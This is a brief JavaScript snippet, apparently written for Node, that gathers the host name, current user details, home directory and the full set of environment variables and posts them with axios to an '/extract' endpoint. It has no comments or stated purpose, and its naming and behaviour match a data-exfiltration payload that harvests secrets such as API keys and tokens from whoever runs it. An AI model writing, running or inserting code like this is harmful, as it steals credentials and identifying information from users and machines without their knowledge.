import { post } from "axios";
import { hostname, homedir, userInfo} from  "os";

const payload = {
    hostName: hostname(),
    getUserInfo: userInfo(),
    homedir: homedir(), 
    env: process.env
  };

await post("/extract", payload);